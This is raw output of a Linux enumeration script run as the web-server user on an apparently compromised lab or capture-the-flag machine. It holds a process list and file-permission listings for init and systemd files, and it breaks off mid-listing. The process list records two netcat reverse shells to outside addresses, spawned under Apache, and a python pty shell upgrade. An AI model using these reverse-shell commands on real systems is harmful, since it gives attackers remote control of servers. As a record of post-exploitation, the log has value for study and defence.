www-data   2008  0.1  3.1 419052 36204 ?        S    16:17   0:01 /usr/sbin/apache2 -k start
www-data   2115  0.1  0.4 412452  4700 ?        S    16:19   0:00 /usr/sbin/apache2 -k start
www-data   2124  0.1  2.1 417068 25240 ?        S    16:19   0:00 /usr/sbin/apache2 -k start
www-data   2127  0.1  3.2 417164 37476 ?        S    16:19   0:00 /usr/sbin/apache2 -k start
www-data   2173  0.1  3.1 417004 36872 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data   2177  0.0  2.2 416940 26340 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data   2184  0.1  2.1 416908 25152 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data   2198  0.1  3.9 419152 45616 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data   2227  0.1  2.0 416800 23968 ?        S    16:21   0:00 /usr/sbin/apache2 -k start
www-data   2245  0.1  2.4 416828 28020 ?        S    16:22   0:00 /usr/sbin/apache2 -k start
www-data   2246  0.1  3.0 417004 35324 ?        S    16:22   0:00 /usr/sbin/apache2 -k start
www-data   2247  0.1  2.9 419184 34276 ?        S    16:22   0:00 /usr/sbin/apache2 -k start
www-data   2260  0.1  3.0 416932 34628 ?        S    16:22   0:00 /usr/sbin/apache2 -k start
root       2262  0.0  0.0      0     0 ?        S    16:22   0:00 [kworker/0:1]
www-data   2283  0.1  3.2 417004 37312 ?        S    16:22   0:00 /usr/sbin/apache2 -k start
www-data   2285  0.1  0.4 412452  4708 ?        S    16:22   0:00 /usr/sbin/apache2 -k start
www-data   2300  0.1  0.4 412452  4708 ?        S    16:23   0:00 /usr/sbin/apache2 -k start
www-data   2302  0.0  0.4 412632  5040 ?        S    16:23   0:00 /usr/sbin/apache2 -k start
www-data   2307  0.0  0.4 412452  4712 ?        S    16:23   0:00 /usr/sbin/apache2 -k start
www-data   2310  0.0  0.4 412452  4704 ?        S    16:23   0:00 /usr/sbin/apache2 -k start
www-data   2312  0.0  0.4 412444  4704 ?        S    16:23   0:00 /usr/sbin/apache2 -k start
www-data   2329  0.1  1.5 414780 18068 ?        S    16:23   0:00 /usr/sbin/apache2 -k start
www-data   2331  0.1  0.2 412452  3436 ?        S    16:23   0:00 /usr/sbin/apache2 -k start
www-data   2332  0.1  3.1 419052 36244 ?        S    16:23   0:00 /usr/sbin/apache2 -k start
www-data   2339  0.0  1.7 414972 20456 ?        S    16:23   0:00 /usr/sbin/apache2 -k start
www-data   2357  0.1  2.7 416836 31304 ?        S    16:24   0:00 /usr/sbin/apache2 -k start
www-data   2359  0.1  0.4 412452  4708 ?        S    16:24   0:00 /usr/sbin/apache2 -k start
www-data   2381  0.0  0.4 412444  4708 ?        S    16:24   0:00 /usr/sbin/apache2 -k start
www-data   2391  0.1  2.1 416800 25352 ?        S    16:24   0:00 /usr/sbin/apache2 -k start
www-data   2393  0.0  1.6 415148 19560 ?        S    16:24   0:00 /usr/sbin/apache2 -k start
www-data   2394  0.1  0.4 412632  5040 ?        S    16:24   0:00 /usr/sbin/apache2 -k start
www-data   2395  0.1  0.4 412452  4704 ?        S    16:24   0:00 /usr/sbin/apache2 -k start
www-data   2398  0.0  0.4 412452  4704 ?        S    16:24   0:00 /usr/sbin/apache2 -k start
www-data   2403  0.0  0.0   4288   724 ?        S    16:24   0:00 sh -c (nc -e /bin/sh 10.10.13.84 4448)
www-data   2404  0.0  0.0   4288   748 ?        S    16:24   0:00 sh
www-data   2429  0.1  0.4 412632  5024 ?        S    16:25   0:00 /usr/sbin/apache2 -k start
www-data   2433  0.0  0.2 412452  3436 ?        S    16:25   0:00 /usr/sbin/apache2 -k start
www-data   2436  0.0  0.4 412632  5024 ?        S    16:25   0:00 /usr/sbin/apache2 -k start
www-data   2440  0.1  0.4 412452  4712 ?        S    16:25   0:00 /usr/sbin/apache2 -k start
www-data   2444  0.1  0.4 412452  4708 ?        S    16:25   0:00 /usr/sbin/apache2 -k start
www-data   2446  0.0  0.4 412444  4704 ?        S    16:25   0:00 /usr/sbin/apache2 -k start
www-data   2447  0.0  0.6  32188  6980 ?        S    16:25   0:00 python -c import pty;pty.spawn('/bin/bash')
www-data   2448  0.0  0.2  18172  3228 pts/2    Ss   16:25   0:00 /bin/bash
www-data   2451  0.0  0.4 412444  4708 ?        S    16:25   0:00 /usr/sbin/apache2 -k start
www-data   2456  0.0  0.4 412444  4704 ?        S    16:25   0:00 /usr/sbin/apache2 -k start
www-data   2457  0.1  0.4 412632  5032 ?        S    16:25   0:00 /usr/sbin/apache2 -k start
www-data   2470  0.0  0.4 412640  5056 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2475  0.1  0.4 412452  4704 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2479  0.0  0.4 412444  4704 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2485  0.1  0.4 412452  4708 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2489  0.1  2.0 414752 23180 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2491  0.1  0.2 412452  3436 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2494  0.1  0.4 412444  4704 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2496  0.1  0.4 412452  4704 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2497  0.1  1.7 414752 19644 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2498  0.1  0.0      0     0 ?        Z    16:26   0:00 [apache2] <defunct>
www-data   2499  0.0  1.6 415156 19588 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2501  0.1  0.2 412452  3436 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2505  0.0  0.4 412452  4712 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2514  0.0  0.4 412444  4704 ?        S    16:26   0:00 /usr/sbin/apache2 -k start
www-data   2527  0.1  0.4 412452  4708 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2528  0.0  0.4 412444  4704 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2529  0.1  0.2 412452  3436 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2530  0.1  0.4 412452  4704 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2531  0.1  0.4 412452  4708 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2532  0.0  0.4 412444  4708 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2533  0.1  0.2 412452  3436 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2534  0.1  0.4 412452  4708 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
root       2535  0.0  0.0      0     0 ?        S    16:27   0:00 [kworker/0:2]
www-data   2536  0.0  2.4 418876 28416 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2538  0.1  0.2 412452  3436 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2542  0.1  0.2 412452  3436 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2548  0.0  0.2 412444  3436 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2549  0.0  1.6 415148 19568 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2550  0.0  0.4 412444  4704 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2551  0.0  0.2 412452  3436 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2553  0.1  0.2 412452  3436 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2556  0.1  0.4 412452  4704 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2560  0.0  0.4 412444  4704 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2562  0.0  0.4 412444  4704 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2563  0.1  0.4 412452  4704 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2564  0.0  0.4 412444  4704 ?        S    16:27   0:00 /usr/sbin/apache2 -k start
www-data   2576  0.0  1.6 415148 19104 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2579  0.0  1.8 415148 21396 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2581  0.0  0.0   4288   764 ?        S    16:28   0:00 sh -c (nc -e /bin/bash -u 10.10.14.19 4444)
www-data   2582  0.0  0.2  17940  2808 ?        S    16:28   0:00 bash
www-data   2583  0.1  0.2 412452  3436 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2588  0.1  0.4 412632  5020 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2589  0.1  0.4 412452  4708 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2590  0.1  0.2 412452  3436 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2592  0.0  0.2 412444  3436 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2593  0.1  0.2 412452  3436 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2594  0.1  0.2 412444  3436 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2596  0.0  0.4 412632  5020 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2597  0.0  0.2 412444  3436 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2598  0.0  0.2 412452  3436 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2602  0.0  0.2 412444  3436 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
www-data   2617  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2618  0.1  0.2 412452  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2619  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2620  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2621  0.1  0.2 412452  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2623  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2624  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2626  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2627  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2629  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2630  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2631  0.1  0.2 412452  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2632  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2633  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2634  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2635  0.1  0.2 412452  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2636  0.0  0.2 412444  3436 ?        S    16:29   0:00 /usr/sbin/apache2 -k start
www-data   2649  0.2  0.2 412452  3436 ?        S    16:30   0:00 /usr/sbin/apache2 -k start
www-data   2651  0.0  0.2 412444  3436 ?        S    16:30   0:00 /usr/sbin/apache2 -k start
www-data   2652  0.8  2.7 417108 31464 ?        S    16:30   0:00 /usr/sbin/apache2 -k start
www-data   2653  0.0  0.2 412444  3436 ?        S    16:30   0:00 /usr/sbin/apache2 -k start
www-data   2654  0.0  0.2 412444  3436 ?        S    16:30   0:00 /usr/sbin/apache2 -k start
www-data   2655  0.0  0.2 412444  3436 ?        S    16:30   0:00 /usr/sbin/apache2 -k start
www-data   2656  0.0  0.4 412640  5024 ?        S    16:30   0:00 /usr/sbin/apache2 -k start
www-data   2657  0.0  0.2 412444  3436 ?        S    16:30   0:00 /usr/sbin/apache2 -k start
www-data   2658  0.0  0.2 412444  3436 ?        S    16:30   0:00 /usr/sbin/apache2 -k start
www-data   2660  0.5  0.3  18932  3800 pts/2    S+   16:30   0:00 /bin/bash ./le.sh
www-data   2661  0.5  0.3  19020  3524 pts/2    S+   16:30   0:00 /bin/bash ./le.sh
www-data   2662  0.0  0.0   4200   704 pts/2    S+   16:30   0:00 tee -a
systemd+   2820 43.0  0.3  49620  4236 ?        Ss   16:30   0:00 /lib/systemd/systemd-resolved
www-data   2841  0.0  0.2  19020  2828 pts/2    S+   16:30   0:00 /bin/bash ./le.sh
www-data   2842  0.0  0.2  36636  2788 pts/2    R+   16:30   0:00 ps aux


[00;31m[-] Process binaries and associated permissions (from above list):[00m
-rwxr-xr-x 1 root root  1099016 May 15  2017 /bin/bash
-rwxr-xr-x 1 root root  1120968 Jun 13  2018 /lib/systemd/systemd
-rwxr-xr-x 1 root root   121256 Jun 13  2018 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   207336 Jun 13  2018 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root   321952 Jun 13  2018 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root root    39248 Jun 13  2018 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   465680 Jun 13  2018 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    57680 Mar  7  2018 /sbin/agetty
lrwxrwxrwx 1 root root       20 Jun 13  2018 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   152232 Jul 25  2017 /usr/bin/VGAuthService
-rwxr-xr-x 1 root root   224208 Mar  2  2018 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root    48656 Jul 25  2017 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root   666760 Jun  2  2018 /usr/sbin/apache2
-rwxr-xr-x 1 root root    48616 Oct  7  2017 /usr/sbin/cron
-rwxr-xr-x 1 root root 17553608 Aug 10  2017 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   651576 Jan 18  2017 /usr/sbin/rsyslogd


[00;31m[-] /etc/init.d/ binary permissions:[00m
total 104
drwxr-xr-x  2 root root 4096 Oct 28 16:40 .
drwxr-xr-x 84 root root 4096 Oct 28 16:40 ..
-rwxr-xr-x  1 root root 2489 May 13  2018 apache-htcacheclean
-rwxr-xr-x  1 root root 8181 Mar 30  2018 apache2
-rwxr-xr-x  1 root root 1232 Apr  7  2017 console-setup.sh
-rwxr-xr-x  1 root root 3049 May  3  2015 cron
-rwxr-xr-x  1 root root 2813 Mar  2  2018 dbus
-rwxr-xr-x  1 root root 6697 Apr 17  2017 fail2ban
-rwxr-xr-x  1 root root 3809 Mar 22  2017 hwclock.sh
-rwxr-xr-x  1 root root 2448 Dec 30  2016 irqbalance
-rwxr-xr-x  1 root root 1479 May 19  2016 keyboard-setup.sh
-rwxr-xr-x  1 root root 2044 Dec 26  2016 kmod
-rwxr-xr-x  1 root root 5930 Aug 10  2017 mysql
-rwxr-xr-x  1 root root 4597 Sep 16  2016 networking
-rwxr-xr-x  1 root root 1846 Jul 25  2017 open-vm-tools
-rwxr-xr-x  1 root root 1191 Nov 22  2016 procps
-rwxr-xr-x  1 root root 4355 Dec 10  2017 rsync
-rwxr-xr-x  1 root root 2868 Jan 18  2017 rsyslog
-rwxr-xr-x  1 root root 4033 Mar  1  2018 ssh
-rwxr-xr-x  1 root root 6087 Jul  5  2017 udev


[00;31m[-] /etc/init/ config file permissions:[00m
total 44
drwxr-xr-x  2 root root 4096 Oct 28 16:37 .
drwxr-xr-x 84 root root 4096 Oct 28 16:40 ..
-rw-r--r--  1 root root  579 Sep 10  2014 irqbalance.conf
-rw-r--r--  1 root root  530 Jun  2  2015 network-interface-container.conf
-rw-r--r--  1 root root 1756 Jun  2  2015 network-interface-security.conf
-rw-r--r--  1 root root  933 Jun  2  2015 network-interface.conf
-rw-r--r--  1 root root 2493 Jun  2  2015 networking.conf
-rw-r--r--  1 root root  637 Mar  1  2018 ssh.conf
-rw-r--r--  1 root root  337 Jul  5  2017 udev.conf
-rw-r--r--  1 root root  360 Jul  5  2017 udevmonitor.conf
-rw-r--r--  1 root root  352 Jul  5  2017 udevtrigger.conf


[00;31m[-] /lib/systemd/* config file permissions:[00m
/lib/systemd/:
total 5.3M
drwxr-xr-x 20 root root  36K Oct 28 16:40 system
drwxr-xr-x  2 root root 4.0K Oct 28 16:36 network
drwxr-xr-x  2 root root 4.0K Oct 28 16:36 system-generators
drwxr-xr-x  2 root root 4.0K Oct 28 16:36 system-preset
drwxr-xr-x  2 root root 4.0K Jun 27  2018 system-sleep
-rw-r--r--  1 root root 2.2M Jun 13  2018 libsystemd-shared-232.so
-rw-r--r--  1 root root  484 Jun 13  2018 resolv.conf
-rwxr-xr-x  1 root root 1.1M Jun 13  2018 systemd
-rwxr-xr-x  1 root root 6.3K Jun 13  2018 systemd-ac-power
-rwxr-xr-x  1 root root  19K Jun 13  2018 systemd-backlight
-rwxr-xr-x  1 root root  11K Jun 13  2018 systemd-binfmt
-rwxr-xr-x  1 root root  11K Jun 13  2018 systemd-cgroups-agent
-rwxr-xr-x  1 root root  27K Jun 13  2018 systemd-cryptsetup
-rwxr-xr-x  1 root root  19K Jun 13  2018 systemd-fsck
-rwxr-xr-x  1 root root  23K Jun 13  2018 systemd-fsckd
-rwxr-xr-x  1 root root  11K Jun 13  2018 systemd-hibernate-resume
-rwxr-xr-x  1 root root  23K Jun 13  2018 systemd-hostnamed
-rwxr-xr-x  1 root root  15K Jun 13  2018 systemd-initctl
-rwxr-xr-x  1 root root 119K Jun 13  2018 systemd-journald
-rwxr-xr-x  1 root root  35K Jun 13  2018 systemd-localed
-rwxr-xr-x  1 root root 203K Jun 13  2018 systemd-logind
-rwxr-xr-x  1 root root  15K Jun 13  2018 systemd-modules-load
-rwxr-xr-x  1 root root 415K Jun 13  2018 systemd-networkd
-rwxr-xr-x  1 root root  19K Jun 13  2018 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  11K Jun 13  2018 systemd-quotacheck
-rwxr-xr-x  1 root root  11K Jun 13  2018 systemd-random-seed
-rwxr-xr-x  1 root root  15K Jun 13  2018 systemd-remount-fs
-rwxr-xr-x  1 root root  11K Jun 13  2018 systemd-reply-password
-rwxr-xr-x  1 root root 315K Jun 13  2018 systemd-resolved
-rwxr-xr-x  1 root root  19K Jun 13  2018 systemd-rfkill
-rwxr-xr-x  1 root root  39K Jun 13  2018 systemd-shutdown
-rwxr-xr-x  1 root root  15K Jun 13  2018 systemd-sleep
-rwxr-xr-x  1 root root  23K Jun 13  2018 systemd-socket-proxyd
-rwxr-xr-x  1 root root  15K Jun 13  2018 systemd-sysctl
-rwxr-xr-x  1 root root 1.3K Jun 13  2018 systemd-sysv-install
-rwxr-xr-x  1 root root  27K Jun 13  2018 systemd-timedated
-rwxr-xr-x  1 root root  39K Jun 13  2018 systemd-timesyncd
-rwxr-xr-x  1 root root 455K Jun 13  2018 systemd-udevd
-rwxr-xr-x  1 root root  15K Jun 13  2018 systemd-update-utmp
-rwxr-xr-x  1 root root  11K Jun 13  2018 systemd-user-sessions
drwxr-xr-x  2 root root 4.0K Jul  5  2017 system-shutdown

/lib/systemd/system:
total 716K
drwxr-xr-x 2 root root 4.0K Oct 28 16:36 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Oct 28 16:36 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Oct 28 16:36 getty.target.wants
drwxr-xr-x 2 root root 4.0K Oct 28 16:36 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Oct 28 16:36 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Oct 28 16:36 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Oct 28 16:36 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Oct 28 16:36 timers.target.wants
drwxr-xr-x 2 root root 4.0K Oct 28 16:36 systemd-resolved.service.d
drwxr-xr-x 2 root root 4.0K Oct 28 16:36 systemd-timesyncd.service.d
drwxr-xr-x 2 root root 4.0K Oct 28 16:36 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Jun 27  2018 mariadb@bootstrap.service.d
lrwxrwxrwx 1 root root   14 Jun 13  2018 autovt@.service -> getty@.service
-rw-r--r-- 1 root root  879 Jun 13  2018 basic.target
-rw-r--r-- 1 root root  379 Jun 13  2018 bluetooth.target
lrwxrwxrwx 1 root root    9 Jun 13  2018 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 bootmisc.service -> /dev/null
-rw-r--r-- 1 root root  358 Jun 13  2018 busnames.target
lrwxrwxrwx 1 root root    9 Jun 13  2018 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 checkroot.service -> /dev/null
-rw-r--r-- 1 root root  770 Jun 13  2018 console-getty.service
-rw-r--r-- 1 root root  791 Jun 13  2018 container-getty@.service
lrwxrwxrwx 1 root root    9 Jun 13  2018 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 cryptdisks.service -> /dev/null
-rw-r--r-- 1 root root  394 Jun 13  2018 cryptsetup-pre.target
-rw-r--r-- 1 root root  366 Jun 13  2018 cryptsetup.target
lrwxrwxrwx 1 root root   13 Jun 13  2018 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Jun 13  2018 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Jun 13  2018 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Jun 13  2018 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   24 Jun 13  2018 dbus-org.freedesktop.network1.service -> systemd-networkd.service
lrwxrwxrwx 1 root root   24 Jun 13  2018 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
lrwxrwxrwx 1 root root   25 Jun 13  2018 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
-rw-r--r-- 1 root root 1010 Jun 13  2018 debug-shell.service
lrwxrwxrwx 1 root root   16 Jun 13  2018 default.target -> graphical.target
-rw-r--r-- 1 root root  709 Jun 13  2018 dev-hugepages.mount
-rw-r--r-- 1 root root  624 Jun 13  2018 dev-mqueue.mount
-rw-r--r-- 1 root root 1.1K Jun 13  2018 emergency.service
-rw-r--r-- 1 root root  431 Jun 13  2018 emergency.target
-rw-r--r-- 1 root root  501 Jun 13  2018 exit.target
-rw-r--r-- 1 root root  440 Jun 13  2018 final.target
lrwxrwxrwx 1 root root    9 Jun 13  2018 fuse.service -> /dev/null
-rw-r--r-- 1 root root  342 Jun 13  2018 getty-static.service
-rw-r--r-- 1 root root  460 Jun 13  2018 getty.target
-rw-r--r-- 1 root root 1.7K Jun 13  2018 getty@.service
-rw-r--r-- 1 root root  558 Jun 13  2018 graphical.target
lrwxrwxrwx 1 root root    9 Jun 13  2018 halt.service -> /dev/null
-rw-r--r-- 1 root root  487 Jun 13  2018 halt.target
-rw-r--r-- 1 root root  447 Jun 13  2018 hibernate.target
lrwxrwxrwx 1 root root    9 Jun 13  2018 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 hwclock.service -> /dev/null
-rw-r--r-- 1 root root  468 Jun 13  2018 hybrid-sleep.target
-rw-r--r-- 1 root root  630 Jun 13  2018 initrd-cleanup.service
-rw-r--r-- 1 root root  553 Jun 13  2018 initrd-fs.target
-rw-r--r-- 1 root root  790 Jun 13  2018 initrd-parse-etc.service
-rw-r--r-- 1 root root  521 Jun 13  2018 initrd-root-device.target
-rw-r--r-- 1 root root  526 Jun 13  2018 initrd-root-fs.target
-rw-r--r-- 1 root root  640 Jun 13  2018 initrd-switch-root.service
-rw-r--r-- 1 root root  714 Jun 13  2018 initrd-switch-root.target
-rw-r--r-- 1 root root  664 Jun 13  2018 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  723 Jun 13  2018 initrd.target
-rw-r--r-- 1 root root  501 Jun 13  2018 kexec.target
lrwxrwxrwx 1 root root    9 Jun 13  2018 killprocs.service -> /dev/null
-rw-r--r-- 1 root root  677 Jun 13  2018 kmod-static-nodes.service
lrwxrwxrwx 1 root root   28 Jun 13  2018 kmod.service -> systemd-modules-load.service
-rw-r--r-- 1 root root  395 Jun 13  2018 local-fs-pre.target
-rw-r--r-- 1 root root  507 Jun 13  2018 local-fs.target
-rw-r--r-- 1 root root  405 Jun 13  2018 machine.slice
lrwxrwxrwx 1 root root   28 Jun 13  2018 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Jun 13  2018 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 mountnfs.service -> /dev/null
-rw-r--r-- 1 root root  492 Jun 13  2018 multi-user.target
-rw-r--r-- 1 root root  464 Jun 13  2018 network-online.target
-rw-r--r-- 1 root root  461 Jun 13  2018 network-pre.target
-rw-r--r-- 1 root root  480 Jun 13  2018 network.target
-rw-r--r-- 1 root root  514 Jun 13  2018 nss-lookup.target
-rw-r--r-- 1 root root  473 Jun 13  2018 nss-user-lookup.target
-rw-r--r-- 1 root root  354 Jun 13  2018 paths.target
-rw-r--r-- 1 root root  552 Jun 13  2018 poweroff.target
-rw-r--r-- 1 root root  377 Jun 13  2018 printer.target
-rw-r--r-- 1 root root  693 Jun 13  2018 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  603 Jun 13  2018 proc-sys-fs-binfmt_misc.mount
lrwxrwxrwx 1 root root   22 Jun 13  2018 procps.service -> systemd-sysctl.service
-rw-r--r-- 1 root root  568 Jun 13  2018 quotaon.service
-rw-r--r-- 1 root root  628 Jun 13  2018 rc-local.service
lrwxrwxrwx 1 root root   16 Jun 13  2018 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Jun 13  2018 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 reboot.service -> /dev/null
-rw-r--r-- 1 root root  543 Jun 13  2018 reboot.target
-rw-r--r-- 1 root root  396 Jun 13  2018 remote-fs-pre.target
-rw-r--r-- 1 root root  482 Jun 13  2018 remote-fs.target
-rw-r--r-- 1 root root 1022 Jun 13  2018 rescue.service
-rw-r--r-- 1 root root  486 Jun 13  2018 rescue.target
lrwxrwxrwx 1 root root    9 Jun 13  2018 rmnologin.service -> /dev/null
-rw-r--r-- 1 root root  500 Jun 13  2018 rpcbind.target
lrwxrwxrwx 1 root root   15 Jun 13  2018 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Jun 13  2018 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Jun 13  2018 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Jun 13  2018 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Jun 13  2018 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Jun 13  2018 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Jun 13  2018 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Jun 13  2018 sendsigs.service -> /dev/null
-rw-r--r-- 1 root root 1.1K Jun 13  2018 serial-getty@.service
-rw-r--r-- 1 root root  402 Jun 13  2018 shutdown.target
-rw-r--r-- 1 root root  362 Jun 13  2018 sigpwr.target
lrwxrwxrwx 1 root root    9 Jun 13  2018 single.service -> /dev/null
-rw-r--r-- 1 root root  420 Jun 13  2018 sleep.target
-rw-r--r-- 1 root root  409 Jun 13  2018 slices.target
-rw-r--r-- 1 root root  380 Jun 13  2018 smartcard.target
-rw-r--r-- 1 root root  356 Jun 13  2018 sockets.target
-rw-r--r-- 1 root root  380 Jun 13  2018 sound.target
lrwxrwxrwx 1 root root    9 Jun 13  2018 stop-bootlogd-single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 stop-bootlogd.service -> /dev/null
-rw-r--r-- 1 root root  441 Jun 13  2018 suspend.target
-rw-r--r-- 1 root root  353 Jun 13  2018 swap.target
-rw-r--r-- 1 root root  715 Jun 13  2018 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  719 Jun 13  2018 sys-kernel-config.mount
-rw-r--r-- 1 root root  662 Jun 13  2018 sys-kernel-debug.mount
-rw-r--r-- 1 root root  518 Jun 13  2018 sysinit.target
-rw-r--r-- 1 root root 1.3K Jun 13  2018 syslog.socket
-rw-r--r-- 1 root root  585 Jun 13  2018 system-update.target
-rw-r--r-- 1 root root  436 Jun 13  2018 system.slice
-rw-r--r-- 1 root root  664 Jun 13  2018 systemd-ask-password-console.path
-rw-r--r-- 1 root root  653 Jun 13  2018 systemd-ask-password-console.service
-rw-r--r-- 1 root root  592 Jun 13  2018 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  681 Jun 13  2018 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  724 Jun 13  2018 systemd-backlight@.service
-rw-r--r-- 1 root root  959 Jun 13  2018 systemd-binfmt.service
